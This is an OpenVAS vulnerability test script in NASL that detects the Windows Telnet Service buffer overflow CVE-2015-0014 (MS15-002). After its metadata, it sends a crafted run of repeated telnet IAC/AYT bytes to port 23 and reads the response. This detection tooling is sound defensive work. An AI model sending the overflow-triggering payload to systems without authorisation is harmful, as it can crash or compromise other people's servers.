###############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft Windows Telnet Service RCE Vulnerability-Remote (3020393)
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805039");
  script_version("2020-08-24T08:40:10+0000");
  script_cve_id("CVE-2015-0014");
  script_bugtraq_id(71968);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2015-01-21 13:55:47 +0530 (Wed, 21 Jan 2015)");
  script_name("Microsoft Windows Telnet Service RCE Vulnerability-Remote (3020393)");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"This host is missing a critical security
  update according to Microsoft Bulletin MS15-002.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.");

  script_tag(name:"insight", value:"The flaw is triggered as user-supplied input
  is not properly validated. With a specially crafted telnet packet, a remote
  attacker can cause a buffer overflow, resulting in a denial of service or
  potentially allowing the execution of arbitrary code.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote
  attackers to compromise the affected system.");

  script_tag(name:"affected", value:"- Microsoft Windows 8 x32/x64

  - Microsoft Windows Server 2012/R2

  - Microsoft Windows 8.1 x32/x64

  - Microsoft Windows 7 x32/x64 Service Pack 1 and prior

  - Microsoft Windows 2003 x32/x64 Service Pack 2 and prior

  - Microsoft Windows Vista x32/x64 Service Pack 2 and prior

  - Microsoft Windows Server 2008 x32/x64 Service Pack 2 and prior

  - Microsoft Windows Server 2008 R2 x64 Service Pack 1 and prior");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"qod_type", value:"remote_active");

  script_xref(name:"URL", value:"http://blog.beyondtrust.com/20897");
  script_xref(name:"URL", value:"http://drops.wooyun.org/papers/4621");
  script_xref(name:"URL", value:"http://support.microsoft.com/kb/3020393");
  script_xref(name:"URL", value:"https://technet.microsoft.com/library/security/MS15-002");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/microsoft/telnet_service/detected");

  exit(0);
}

include("telnet_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("dump.inc");

tport = telnet_get_port(default:23);
tbanner = telnet_get_banner(port:tport);
if(!tbanner || "Welcome to Microsoft Telnet Service" >!< tbanner)
  exit(0);

payload = raw_string(0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6, 0xff, 0xf6,
                     0xff, 0xf6);

soc = open_sock_tcp(tport);
if(!soc){
  exit(0);
}

send(socket:soc, data: payload + "\r\n");
resp = recv(socket:soc, length:4096);
close(soc);

if(resp && "[Yes]" >!< resp && strlen(resp) <= 21){
  security_message(tport);
  exit( 0 );
}

exit( 99 );
